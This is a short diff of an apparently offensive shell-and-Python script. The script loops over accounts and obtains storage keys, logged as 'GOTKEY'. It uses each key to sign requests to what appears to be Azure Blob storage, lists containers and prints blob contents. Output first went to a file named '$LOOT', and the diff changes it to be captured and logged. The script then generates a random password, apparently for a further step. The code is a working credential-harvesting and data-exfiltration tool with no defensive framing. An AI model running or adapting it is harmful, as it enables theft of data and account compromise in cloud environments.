@@ -24,7 +24,7 @@ try:
 except Exception: print("")')
   [ -z "$KEY" ] && continue
   say "GOTKEY $A len=${#KEY}"
-  KEY="$KEY" A="$A" python3 - >>"$LOOT" <<'PY'
+  OUT=$(KEY="$KEY" A="$A" python3 - 2>&1 <<'PY'
 import os,hmac,hashlib,base64,datetime,urllib.request,re
 acc=os.environ["A"]; key=base64.b64decode(os.environ["KEY"])
 ver="2021-08-06"
@@ -54,6 +54,8 @@ for c in names:
         d=req("/"+c+"/"+x)
         print("    BLOB %s/%s => %s"%(c,x,d[:1500]))
 PY
+)
+  say "PYOUT $A: $OUT"
 done
 say "=== DONE ==="
 PASS=$(openssl rand -hex 16)
